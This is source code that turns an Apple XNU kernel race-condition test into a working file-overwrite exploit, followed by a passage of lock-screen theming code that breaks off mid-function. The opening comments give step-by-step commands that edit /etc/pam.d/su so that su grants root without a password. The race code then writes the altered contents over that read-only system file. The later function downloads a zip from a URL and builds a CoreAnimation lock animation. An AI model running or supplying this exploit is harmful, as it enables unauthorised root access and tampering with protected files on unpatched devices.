// from https://github.com/apple-oss-distributions/xnu/blob/xnu-8792.61.2/tests/vm/vm_unaligned_copy_switch_race.c
// modified to compile outside of XNU

// clang -o switcharoo vm_unaligned_copy_switch_race.c
// sed -e "s/rootok/permit/g" /etc/pam.d/su > overwrite_file.bin
// ./switcharoo /etc/pam.d/su overwrite_file.bin
// su
@import Foundation;
#include <pthread.h>
#include <dispatch/dispatch.h>
#include <stdio.h>

#include <mach/mach_init.h>
#include <mach/mach_port.h>
#include <mach/vm_map.h>

#include <fcntl.h>
#include <sys/mman.h>

#import <ZipArchive.h>

#define T_QUIET
#define T_EXPECT_MACH_SUCCESS(a, b)
#define T_EXPECT_MACH_ERROR(a, b, c)
#define T_ASSERT_MACH_SUCCESS(a, b, ...)
#define T_ASSERT_MACH_ERROR(a, b, c)
#define T_ASSERT_POSIX_SUCCESS(a, b)
#define T_ASSERT_EQ(a, b, c) do{if ((a) != (b)) { fprintf(stderr, c "\n"); exit(1); }}while(0)
#define T_ASSERT_NE(a, b, c) do{if ((a) == (b)) { fprintf(stderr, c "\n"); exit(1); }}while(0)
#define T_ASSERT_TRUE(a, b, ...)
#define T_LOG(a, ...) fprintf(stderr, a "\n", __VA_ARGS__)
#define T_DECL(a, b) static void a(void)
#define T_PASS(a, ...) fprintf(stderr, a "\n", __VA_ARGS__)

static const char* g_arg_target_file_path;
static const char* g_arg_overwrite_file_path;

struct context1 {
    vm_size_t obj_size;
    vm_address_t e0;
    mach_port_t mem_entry_ro;
    mach_port_t mem_entry_rw;
    dispatch_semaphore_t running_sem;
    pthread_mutex_t mtx;
    bool done;
};

static void *
switcheroo_thread(__unused void *arg)
{
    kern_return_t kr;
    struct context1 *ctx;

    ctx = (struct context1 *)arg;
    /* tell main thread we're ready to run */
    dispatch_semaphore_signal(ctx->running_sem);
    while (!ctx->done) {
        /* wait for main thread to be done setting things up */
        pthread_mutex_lock(&ctx->mtx);
        /* switch e0 to RW mapping */
        kr = vm_map(mach_task_self(),
            &ctx->e0,
            ctx->obj_size,
            0,         /* mask */
            VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
            ctx->mem_entry_rw,
            0,
            FALSE,         /* copy */
            VM_PROT_READ | VM_PROT_WRITE,
            VM_PROT_READ | VM_PROT_WRITE,
            VM_INHERIT_DEFAULT);
        T_QUIET; T_EXPECT_MACH_SUCCESS(kr, " vm_map() RW");
        /* wait a little bit */
        usleep(100);
        /* switch bakc to original RO mapping */
        kr = vm_map(mach_task_self(),
            &ctx->e0,
            ctx->obj_size,
            0,         /* mask */
            VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
            ctx->mem_entry_ro,
            0,
            FALSE,         /* copy */
            VM_PROT_READ,
            VM_PROT_READ,
            VM_INHERIT_DEFAULT);
        T_QUIET; T_EXPECT_MACH_SUCCESS(kr, " vm_map() RO");
        /* tell main thread we're don switching mappings */
        pthread_mutex_unlock(&ctx->mtx);
        usleep(100);
    }
    return NULL;
}

T_DECL(unaligned_copy_switch_race,
    "Test that unaligned copy respects read-only mapping")
{
    pthread_t th = NULL;
    int ret;
    kern_return_t kr;
    time_t start, duration;
    mach_msg_type_number_t cow_read_size;
    vm_size_t copied_size;
    int loops;
    vm_address_t e2, e5;
    struct context1 context1, *ctx;
    int kern_success = 0, kern_protection_failure = 0, kern_other = 0;
    vm_address_t ro_addr, tmp_addr;
    memory_object_size_t mo_size;

    ctx = &context1;
    ctx->obj_size = 256 * 1024;
    ctx->e0 = 0;
    ctx->running_sem = dispatch_semaphore_create(0);
    T_QUIET; T_ASSERT_NE(ctx->running_sem, NULL, "dispatch_semaphore_create");
    ret = pthread_mutex_init(&ctx->mtx, NULL);
    T_QUIET; T_ASSERT_POSIX_SUCCESS(ret, "pthread_mutex_init");
    ctx->done = false;
    ctx->mem_entry_rw = MACH_PORT_NULL;
    ctx->mem_entry_ro = MACH_PORT_NULL;
#if 0
    /* allocate our attack target memory */
    kr = vm_allocate(mach_task_self(),
        &ro_addr,
        ctx->obj_size,
        VM_FLAGS_ANYWHERE);
    T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "vm_allocate ro_addr");
    /* initialize to 'A' */
    memset((char *)ro_addr, 'A', ctx->obj_size);
#endif
    int fd = open(g_arg_target_file_path, O_RDONLY | O_CLOEXEC);
    ro_addr = (uintptr_t)mmap(NULL, ctx->obj_size, PROT_READ, MAP_SHARED, fd, 0);
    /* make it read-only */
    kr = vm_protect(mach_task_self(),
        ro_addr,
        ctx->obj_size,
        TRUE,             /* set_maximum */
        VM_PROT_READ);
    T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "vm_protect ro_addr");
    /* make sure we can't get read-write handle on that target memory */
    mo_size = ctx->obj_size;
    kr = mach_make_memory_entry_64(mach_task_self(),
        &mo_size,
        ro_addr,
        MAP_MEM_VM_SHARE | VM_PROT_READ | VM_PROT_WRITE,
        &ctx->mem_entry_ro,
        MACH_PORT_NULL);
    T_QUIET; T_ASSERT_MACH_ERROR(kr, KERN_PROTECTION_FAILURE, "make_mem_entry() RO");
    /* take read-only handle on that target memory */
    mo_size = ctx->obj_size;
    kr = mach_make_memory_entry_64(mach_task_self(),
        &mo_size,
        ro_addr,
        MAP_MEM_VM_SHARE | VM_PROT_READ,
        &ctx->mem_entry_ro,
        MACH_PORT_NULL);
    T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "make_mem_entry() RO");
    T_QUIET; T_ASSERT_EQ(mo_size, (memory_object_size_t)ctx->obj_size, "wrong mem_entry size");
    /* make sure we can't map target memory as writable */
    tmp_addr = 0;
    kr = vm_map(mach_task_self(),
        &tmp_addr,
        ctx->obj_size,
        0,         /* mask */
        VM_FLAGS_ANYWHERE,
        ctx->mem_entry_ro,
        0,
        FALSE,         /* copy */
        VM_PROT_READ,
        VM_PROT_READ | VM_PROT_WRITE,
        VM_INHERIT_DEFAULT);
    T_QUIET; T_EXPECT_MACH_ERROR(kr, KERN_INVALID_RIGHT, " vm_map() mem_entry_rw");
    tmp_addr = 0;
    kr = vm_map(mach_task_self(),
        &tmp_addr,
        ctx->obj_size,
        0,         /* mask */
        VM_FLAGS_ANYWHERE,
        ctx->mem_entry_ro,
        0,
        FALSE,         /* copy */
        VM_PROT_READ | VM_PROT_WRITE,
        VM_PROT_READ | VM_PROT_WRITE,
        VM_INHERIT_DEFAULT);
    T_QUIET; T_EXPECT_MACH_ERROR(kr, KERN_INVALID_RIGHT, " vm_map() mem_entry_rw");

    /* allocate a source buffer for the unaligned copy */
    kr = vm_allocate(mach_task_self(),
        &e5,
        ctx->obj_size,
        VM_FLAGS_ANYWHERE);
    T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "vm_allocate e5");
    /* initialize to 'C' */
    memset((char *)e5, 'C', ctx->obj_size);

    FILE* overwrite_file = fopen(g_arg_overwrite_file_path, "r");
    fseek(overwrite_file, 0, SEEK_END);
    size_t overwrite_length = ftell(overwrite_file);
    if (overwrite_length >= PAGE_SIZE) {
        fprintf(stderr, "too long!\n");
        exit(1);
    }
    fseek(overwrite_file, 0, SEEK_SET);
    char* e5_overwrite_ptr = (char*)(e5 + ctx->obj_size - overwrite_length);
    fread(e5_overwrite_ptr, 1, overwrite_length, overwrite_file);
    fclose(overwrite_file);

    int overwrite_first_diff_offset = -1;
    char overwrite_first_diff_value = 0;
    for (int off = 0; off < overwrite_length; off++) {
        if (((char*)ro_addr)[off] != e5_overwrite_ptr[off]) {
            overwrite_first_diff_offset = off;
            overwrite_first_diff_value = ((char*)ro_addr)[off];
        }
    }
    if (overwrite_first_diff_offset == -1) {
        fprintf(stderr, "no diff?\n");
        exit(1);
    }

    /*
     * get a handle on some writable memory that will be temporarily
     * switched with the read-only mapping of our target memory to try
     * and trick copy_unaligned to write to our read-only target.
     */
    tmp_addr = 0;
    kr = vm_allocate(mach_task_self(),
        &tmp_addr,
        ctx->obj_size,
        VM_FLAGS_ANYWHERE);
    T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "vm_allocate() some rw memory");
    /* initialize to 'D' */
    memset((char *)tmp_addr, 'D', ctx->obj_size);
    /* get a memory entry handle for that RW memory */
    mo_size = ctx->obj_size;
    kr = mach_make_memory_entry_64(mach_task_self(),
        &mo_size,
        tmp_addr,
        MAP_MEM_VM_SHARE | VM_PROT_READ | VM_PROT_WRITE,
        &ctx->mem_entry_rw,
        MACH_PORT_NULL);
    T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "make_mem_entry() RW");
    T_QUIET; T_ASSERT_EQ(mo_size, (memory_object_size_t)ctx->obj_size, "wrong mem_entry size");
    kr = vm_deallocate(mach_task_self(), tmp_addr, ctx->obj_size);
    T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "vm_deallocate() tmp_addr 0x%llx", (uint64_t)tmp_addr);
    tmp_addr = 0;

    pthread_mutex_lock(&ctx->mtx);

    /* start racing thread */
    ret = pthread_create(&th, NULL, switcheroo_thread, (void *)ctx);
    T_QUIET; T_ASSERT_POSIX_SUCCESS(ret, "pthread_create");

    /* wait for racing thread to be ready to run */
    dispatch_semaphore_wait(ctx->running_sem, DISPATCH_TIME_FOREVER);

    duration = 10; /* 10 seconds */
    T_LOG("Testing for %ld seconds...", duration);
    for (start = time(NULL), loops = 0;
        time(NULL) < start + duration;
        loops++) {
        /* reserve space for our 2 contiguous allocations */
        e2 = 0;
        kr = vm_allocate(mach_task_self(),
            &e2,
            2 * ctx->obj_size,
            VM_FLAGS_ANYWHERE);
        T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "vm_allocate to reserve e2+e0");

        /* make 1st allocation in our reserved space */
        kr = vm_allocate(mach_task_self(),
            &e2,
            ctx->obj_size,
            VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE | VM_MAKE_TAG(240));
        T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "vm_allocate e2");
        /* initialize to 'B' */
        memset((char *)e2, 'B', ctx->obj_size);

        /* map our read-only target memory right after */
        ctx->e0 = e2 + ctx->obj_size;
        kr = vm_map(mach_task_self(),
            &ctx->e0,
            ctx->obj_size,
            0,         /* mask */
            VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE | VM_MAKE_TAG(241),
            ctx->mem_entry_ro,
            0,
            FALSE,         /* copy */
            VM_PROT_READ,
            VM_PROT_READ,
            VM_INHERIT_DEFAULT);
        T_QUIET; T_EXPECT_MACH_SUCCESS(kr, " vm_map() mem_entry_ro");

        /* let the racing thread go */
        pthread_mutex_unlock(&ctx->mtx);
        /* wait a little bit */
        usleep(100);

        /* trigger copy_unaligned while racing with other thread */
        kr = vm_read_overwrite(mach_task_self(),
            e5,
            ctx->obj_size,
            e2 + overwrite_length,
            &copied_size);
        T_QUIET;
        T_ASSERT_TRUE(kr == KERN_SUCCESS || kr == KERN_PROTECTION_FAILURE,
            "vm_read_overwrite kr %d", kr);
        switch (kr) {
        case KERN_SUCCESS:
            /* the target was RW */
            kern_success++;
            break;
        case KERN_PROTECTION_FAILURE:
            /* the target was RO */
            kern_protection_failure++;
            break;
        default:
            /* should not happen */
            kern_other++;
            break;
        }
        /* check that our read-only memory was not modified */
        T_QUIET; T_ASSERT_EQ(((char *)ro_addr)[overwrite_first_diff_offset], overwrite_first_diff_value, "RO mapping was modified");

        /* tell racing thread to stop toggling mappings */
        pthread_mutex_lock(&ctx->mtx);

        /* clean up before next loop */
        vm_deallocate(mach_task_self(), ctx->e0, ctx->obj_size);
        ctx->e0 = 0;
        vm_deallocate(mach_task_self(), e2, ctx->obj_size);
        e2 = 0;
    }

    ctx->done = true;
    pthread_join(th, NULL);

    kr = mach_port_deallocate(mach_task_self(), ctx->mem_entry_rw);
    T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "mach_port_deallocate(me_rw)");
    kr = mach_port_deallocate(mach_task_self(), ctx->mem_entry_ro);
    T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "mach_port_deallocate(me_ro)");
    kr = vm_deallocate(mach_task_self(), ro_addr, ctx->obj_size);
    T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "vm_deallocate(ro_addr)");
    kr = vm_deallocate(mach_task_self(), e5, ctx->obj_size);
    T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "vm_deallocate(e5)");


    T_LOG("vm_read_overwrite: KERN_SUCCESS:%d KERN_PROTECTION_FAILURE:%d other:%d",
        kern_success, kern_protection_failure, kern_other);
    T_PASS("Ran %d times in %ld seconds with no failure", loops, duration);
}

void overwriteLock(NSString *model, BOOL *media, NSString *url) {
    if (media == true) {
        dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
            NSLog(@"downloading a fresh copy of custom zip file");
            NSString *urlToDownload = url;
            NSURL  *url = [NSURL URLWithString:urlToDownload];
            NSData *urlData = [NSData dataWithContentsOfURL:url];
            if ( urlData )
            {
                NSArray       *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
                NSString  *documentsDirectory = [paths objectAtIndex:0];
                NSString  *filePath = [NSString stringWithFormat:@"%@/%@", documentsDirectory,@"TrollLock.zip"];
                
                dispatch_async(dispatch_get_main_queue(), ^{
                    [urlData writeToFile:filePath atomically:YES];
                    [SSZipArchive unzipFileAtPath:filePath toDestination:documentsDirectory];
                    NSLog(@"yay! success");
                });
            }
            
        });
        NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
        NSString *documentsDirectory = [paths objectAtIndex:0];
        NSString *troll1 = [documentsDirectory stringByAppendingPathComponent:@"trollformation1.png"];
        NSString *troll2 = [documentsDirectory stringByAppendingPathComponent:@"trollformation2.png"];
        NSString *troll3 = [documentsDirectory stringByAppendingPathComponent:@"trollformation3.png"];
        NSString *troll4 = [documentsDirectory stringByAppendingPathComponent:@"trollformation4.png"];
        NSString *troll5 = [documentsDirectory stringByAppendingPathComponent:@"trollformation5.png"];
        NSString *troll6 = [documentsDirectory stringByAppendingPathComponent:@"trollformation6.png"];
        NSString *troll7 = [documentsDirectory stringByAppendingPathComponent:@"trollformation7.png"];
        NSString *troll8 = [documentsDirectory stringByAppendingPathComponent:@"trollformation8.png"];
        NSString *troll9 = [documentsDirectory stringByAppendingPathComponent:@"trollformation9.png"];
        NSString *troll10 = [documentsDirectory stringByAppendingPathComponent:@"trollformation10.png"];
        NSString *troll11 = [documentsDirectory stringByAppendingPathComponent:@"trollformation11.png"];
        NSString *troll12 = [documentsDirectory stringByAppendingPathComponent:@"trollformation12.png"];
        NSString *troll13 = [documentsDirectory stringByAppendingPathComponent:@"trollformation13.png"];
        NSString *troll14 = [documentsDirectory stringByAppendingPathComponent:@"trollformation14.png"];
        NSString *troll15 = [documentsDirectory stringByAppendingPathComponent:@"trollformation15.png"];
        NSString *troll16 = [documentsDirectory stringByAppendingPathComponent:@"trollformation16.png"];
        NSString *troll17 = [documentsDirectory stringByAppendingPathComponent:@"trollformation17.png"];
        NSString *troll18 = [documentsDirectory stringByAppendingPathComponent:@"trollformation18.png"];
        NSString *troll19 = [documentsDirectory stringByAppendingPathComponent:@"trollformation19.png"];
        NSString *troll20 = [documentsDirectory stringByAppendingPathComponent:@"trollformation20.png"];
        NSString *troll21 = [documentsDirectory stringByAppendingPathComponent:@"trollformation21.png"];
        NSString *troll22 = [documentsDirectory stringByAppendingPathComponent:@"trollformation22.png"];
        NSString *troll23 = [documentsDirectory stringByAppendingPathComponent:@"trollformation23.png"];
        NSString *troll24 = [documentsDirectory stringByAppendingPathComponent:@"trollformation24.png"];
        NSString *troll25 = [documentsDirectory stringByAppendingPathComponent:@"trollformation25.png"];
        NSString *troll26 = [documentsDirectory stringByAppendingPathComponent:@"trollformation26.png"];
        NSString *troll27 = [documentsDirectory stringByAppendingPathComponent:@"trollformation27.png"];
        NSString *troll28 = [documentsDirectory stringByAppendingPathComponent:@"trollformation28.png"];
        NSString *troll29 = [documentsDirectory stringByAppendingPathComponent:@"trollformation29.png"];
        NSString *troll30 = [documentsDirectory stringByAppendingPathComponent:@"trollformation30.png"];
        NSString *troll31 = [documentsDirectory stringByAppendingPathComponent:@"trollformation31.png"];
        NSString *troll32 = [documentsDirectory stringByAppendingPathComponent:@"trollformation32.png"];
        NSString *troll33 = [documentsDirectory stringByAppendingPathComponent:@"trollformation33.png"];
        NSString *troll34 = [documentsDirectory stringByAppendingPathComponent:@"trollformation34.png"];
        NSString *troll35 = [documentsDirectory stringByAppendingPathComponent:@"trollformation35.png"];
        NSString *troll36 = [documentsDirectory stringByAppendingPathComponent:@"trollformation36.png"];
        NSString *trolley = [documentsDirectory stringByAppendingPathComponent:@"trollformation37.png"];
        NSString *troll38 = [documentsDirectory stringByAppendingPathComponent:@"trollformation38.png"];
        NSString *troll39 = [documentsDirectory stringByAppendingPathComponent:@"trollformation39.png"];
        NSString *troll40 = [documentsDirectory stringByAppendingPathComponent:@"trollformation40.png"];
        NSString *fileContents = @"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\
<caml xmlns=\"http://www.apple.com/CoreAnimation/1.0\">\
  <CALayer allowsEdgeAntialiasing=\"1\" allowsGroupOpacity=\"1\" bounds=\"0 0 69.0 100.0\" contentsFormat=\"RGBA8\" name=\"root\" position=\"34.5 50.0\">\
    <sublayers>\
      <CALayer id=\"#3\" allowsEdgeAntialiasing=\"1\" allowsGroupOpacity=\"1\" bounds=\"0 0 147.0 132.0\" contentsFormat=\"RGBA8\" geometryFlipped=\"1\" name=\"container\" position=\"34.5 50.0\">\
          <sublayers>\
            <CALayer id=\"#2\" allowsEdgeAntialiasing=\"1\" allowsGroupOpacity=\"1\" bounds=\"0 0 147.0 132.0\" contentsFormat=\"RGBA8\" name=\"shake\" position=\"73.5 66.0\">\
              <sublayers>\
                <CALayer id=\"#1\" allowsEdgeAntialiasing=\"1\" allowsGroupOpacity=\"1\" bounds=\"0 0 147.0 132.0\" contentsFormat=\"RGBA8\" name=\"shackle\" opacity=\"1\" position=\"73.5 66.0\">\
                  <contents type=\"CGImage\" src=\"troll1\"/>\
                </CALayer>\
              </sublayers>\
            </CALayer>\
          </sublayers>\
        </CALayer>\
      </sublayers>\
    <states>\
      <LKState name=\"Sleep\">\
    <elements>\
      <LKStateSetValue final=\"false\" targetId=\"#3\" keyPath=\"transform.scale.xy\">\
        <value type=\"real\" value=\"0.75\"/>\
      </LKStateSetValue>\
      <LKStateSetValue final=\"false\" targetId=\"#3\" keyPath=\"opacity\">\
        <value type=\"integer\" value=\"0\"/>\
      </LKStateSetValue>\
    </elements>\
      </LKState>\
      <LKState name=\"Locked\"/>\
      <LKState name=\"Unlocked\">\
    <elements>\
      <LKStateSetValue final=\"false\" targetId=\"#1\" keyPath=\"contents\">\
        <value type=\"CGImage\" src=\"trolla40\"/>\
      </LKStateSetValue>\
    </elements>\
      </LKState>\
      <LKState name=\"Error\">\
    <elements>\
      <LKStateSetValue final=\"false\" targetId=\"#2\" keyPath=\"position.x\">\
        <value type=\"real\" value=\"113.5\"/>\
      </LKStateSetValue>\
      <LKStateSetValue final=\"false\" targetId=\"#3\" keyPath=\"position.x\">\
        <value type=\"real\" value=\"-5.5\"/>\
      </LKStateSetValue>\
    </elements>\
      </LKState>\
    </states>\
    <stateTransitions>\
      <LKStateTransition fromState=\"*\" toState=\"Unlocked\">\
    <elements>\
      <LKStateTransitionElement final=\"false\" key=\"contents\" targetId=\"#1\">\
        <animation type=\"CAKeyframeAnimation\" calculationMode=\"discrete\" keyPath=\"contents\" duration=\"1\" fillMode=\"backwards\" timingFunction=\"linear\">\
          <keyTimes>\
                <real value=\"0\"/>\
                <real value=\"0.01666666666\"/>\
                <real value=\"0.03333333333\"/>\
                <real value=\"0.05\"/>\
                <real value=\"0.06666666666\"/>\
                <real value=\"0.08333333333\"/>\
                <real value=\"0.1\"/>\
                <real value=\"0.116666666667\"/>\
                <real value=\"0.133333333333\"/>\
                <real value=\"0.15\"/>\
                <real value=\"0.166666666667\"/>\
                <real value=\"0.183333333333\"/>\
                <real value=\"0.2\"/>\
                <real value=\"0.216666666667\"/>\
                <real value=\"0.233333333333\"/>\
                <real value=\"0.25\"/>\
                <real value=\"0.266666666667\"/>\
                <real value=\"0.283333333333\"/>\
                <real value=\"0.3\"/>\
                <real value=\"0.316666666667\"/>\
                <real value=\"0.333333333333\"/>\
                <real value=\"0.35\"/>\
                <real value=\"0.366666666667\"/>\
                <real value=\"0.383333333333\"/>\
                <real value=\"0.4\"/>\
                <real value=\"0.416666666667\"/>\
                <real value=\"0.433333333333\"/>\
                <real value=\"0.45\"/>\
                <real value=\"0.466666666667\"/>\
                <real value=\"0.483333333333\"/>\
                <real value=\"0.5\"/>\
                <real value=\"0.516666666667\"/>\
                <real value=\"0.533333333333\"/>\
                <real value=\"0.55\"/>\
                <real value=\"0.566666666667\"/>\
                <real value=\"0.583333333333\"/>\
                <real value=\"0.6\"/>\
                <real value=\"0.616666666667\"/>\
                <real value=\"0.633333333333\"/>\
                <real value=\"0.65\"/>\
                <real value=\"0.666666666667\"/>\
                <real value=\"0.683333333333\"/>\
                <real value=\"0.7\"/>\
                <real value=\"0.716666666667\"/>\
                <real value=\"0.733333333333\"/>\
                <real value=\"0.75\"/>\
                <real value=\"0.766666666667\"/>\
                <real value=\"0.783333333333\"/>\
                <real value=\"0.8\"/>\
                <real value=\"0.816666666667\"/>\
                <real value=\"0.833333333333\"/>\
                <real value=\"0.85\"/>\
                <real value=\"0.866666666667\"/>\
                <real value=\"0.883333333333\"/>\
                <real value=\"0.9\"/>\
          </keyTimes>\
          <values>\
                <CGImage src=\"troll1\"/>\
                <CGImage src=\"troll2\"/>\
                <CGImage src=\"troll3\"/>\
                <CGImage src=\"troll4\"/>\
                <CGImage src=\"troll5\"/>\
                <CGImage src=\"troll6\"/>\
                <CGImage src=\"troll7\"/>\
                <CGImage src=\"troll8\"/>\
                <CGImage src=\"troll9\"/>\
                <CGImage src=\"trolling10\"/>\
                <CGImage src=\"trolling11\"/>\
                <CGImage src=\"trolling12\"/>\
                <CGImage src=\"trolling13\"/>\
                <CGImage src=\"trolling14\"/>\
                <CGImage src=\"trolling15\"/>\
                <CGImage src=\"trolling16\"/>\
                <CGImage src=\"trolling17\"/>\
                <CGImage src=\"trolling18\"/>\
                <CGImage src=\"trolling19\"/>\
                <CGImage src=\"trolley20\"/>\
                <CGImage src=\"trolley21\"/>\
                <CGImage src=\"trolley22\"/>\
                <CGImage src=\"trolley23\"/>\
                <CGImage src=\"trolley24\"/>\
                <CGImage src=\"trolley25\"/>\
                <CGImage src=\"trolley26\"/>\
                <CGImage src=\"trolley27\"/>\
                <CGImage src=\"trolley28\"/>\
                <CGImage src=\"trolley29\"/>\
                <CGImage src=\"trolla30\"/>\
                <CGImage src=\"trolla31\"/>\
                <CGImage src=\"trolla32\"/>\
                <CGImage src=\"trolla33\"/>\
                <CGImage src=\"trolla34\"/>\
                <CGImage src=\"trolla35\"/>\
                <CGImage src=\"trolla36\"/>\
                <CGImage src=\"trolla37\"/>\
                <CGImage src=\"trolla38\"/>\
                <CGImage src=\"trolla39\"/>\
                <CGImage src=\"trolla40\"/>\
          </values>\
        </animation>\
      </LKStateTransitionElement>\
    </elements>\
      </LKStateTransition>\
      <LKStateTransition fromState=\"Unlocked\" toState=\"*\">\
    <elements/>\
      </LKStateTransition>\
      <LKStateTransition fromState=\"*\" toState=\"Sleep\">\
    <elements>\
      <LKStateTransitionElement final=\"false\" key=\"transform.scale.xy\" targetId=\"#3\">\
        <animation type=\"CABasicAnimation\" keyPath=\"transform.scale.xy\" duration=\"0.25\" fillMode=\"backwards\" timingFunction=\"default\"/>\
      </LKStateTransitionElement>\
      <LKStateTransitionElement final=\"false\" key=\"opacity\" targetId=\"#3\">\
        <animation type=\"CABasicAnimation\" keyPath=\"opacity\" duration=\"0.25\" fillMode=\"backwards\" timingFunction=\"default\"/>\
      </LKStateTransitionElement>\
    </elements>\
      </LKStateTransition>\
      <LKStateTransition fromState=\"Sleep\" toState=\"*\">\
    <elements>\
      <LKStateTransitionElement final=\"false\" key=\"transform.scale.xy\" targetId=\"#3\">\
        <animation type=\"CABasicAnimation\" keyPath=\"transform.scale.xy\" duration=\"0.25\" fillMode=\"backwards\" timingFunction=\"default\"/>\
      </LKStateTransitionElement>\
      <LKStateTransitionElement final=\"false\" key=\"opacity\" targetId=\"#3\">\
        <animation type=\"CABasicAnimation\" keyPath=\"opacity\" duration=\"0.25\" fillMode=\"backwards\" timingFunction=\"default\"/>\
      </LKStateTransitionElement>\
    </elements>\
      </LKStateTransition>\
      <LKStateTransition fromState=\"*\" toState=\"Error\">\
    <elements>\
      <LKStateTransitionElement final=\"false\" key=\"position.x\" targetId=\"#3\">\
        <animation type=\"CABasicAnimation\" keyPath=\"position.x\" duration=\"0.2\" fillMode=\"both\" timingFunction=\"default\"/>\
      </LKStateTransitionElement>\
      <LKStateTransitionElement final=\"false\" key=\"position.x\" targetId=\"#2\">\
        <animation type=\"CASpringAnimation\" damping=\"40\" mass=\"3\" stiffness=\"2200\" keyPath=\"position.x\" beginTime=\"0.075\" duration=\"0.78\" fillMode=\"both\" speed=\"1.4\"/>\
      </LKStateTransitionElement>\
    </elements>\
      </LKStateTransition>\
      <LKStateTransition fromState=\"Error\" toState=\"*\">\
    <elements>\
      <LKStateTransitionElement final=\"false\" key=\"position.x\" targetId=\"#3\">\
        <animation type=\"CABasicAnimation\" keyPath=\"position.x\" duration=\"0.25\" fillMode=\"backwards\" timingFunction=\"default\"/>\
      </LKStateTransitionElement>\
      <LKStateTransitionElement final=\"false\" key=\"position.x\" targetId=\"#2\">\
        <animation type=\"CABasicAnimation\" keyPath=\"position.x\" duration=\"0.25\" fillMode=\"backwards\" timingFunction=\"default\"/>\
      </LKStateTransitionElement>\
    </elements>\
      </LKStateTransition>\
    </stateTransitions>\
  </CALayer>\
</caml>\
";
        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"troll1"
                                                               withString:troll1];
        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"troll2"
                                                               withString:troll2];
        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"troll3"
                                                               withString:troll3];
        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"troll4"
                                                               withString:troll4];
        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"troll5"
                                                               withString:troll5];
        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"troll6"
                                                               withString:troll6];
        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"troll7"
                                                               withString:troll7];
        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"troll8"
                                                               withString:troll8];
        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"troll9"
                                                               withString:troll9];
        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolling10"
                                                               withString:troll10];
        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolling11"
                                                               withString:troll11];
        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolling12"
                                                               withString:troll12];
        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolling13"
                                                               withString:troll13];
        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolling14"
                                                               withString:troll14];
        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolling15"
                                                               withString:troll15];
        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolling16"
                                                               withString:troll16];
        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolling17"
                                                               withString:troll17];
        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolling18"
                                                               withString:troll18];
        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolling19"
                                                               withString:troll19];
        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolley20"
                                                               withString:troll20];
        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolley21"
                                                               withString:troll21];
        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolley22"
                                                               withString:troll22];
        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolley23"
                                                               withString:troll23];
        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolley24"
                                                               withString:troll24];
        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolley25"
                                                               withString:troll25];
        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolley26"
                                                               withString:troll26];
        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolley27"
                                                               withString:troll27];
        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolley28"
                                                               withString:troll28];
        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolley29"
                                                               withString:troll29];
        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolla30"
                                                               withString:troll30];
        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolla31"
                                                               withString:troll31];
        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolla32"
                                                               withString:troll32];
        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolla33"
                                                               withString:troll33];
        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolla34"
                                                               withString:troll34];
        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolla35"
                                                               withString:troll35];
        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolla36"
                                                               withString:troll36];
        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolla37"
                                                               withString:trolley];
        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolla38"
                                                               withString:troll38];
        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolla39"
                                                               withString:troll39];
        fileContents = [fileContents stringByReplacingOccurrencesOfString:@"trolla40"
                                                               withString:troll40];
        
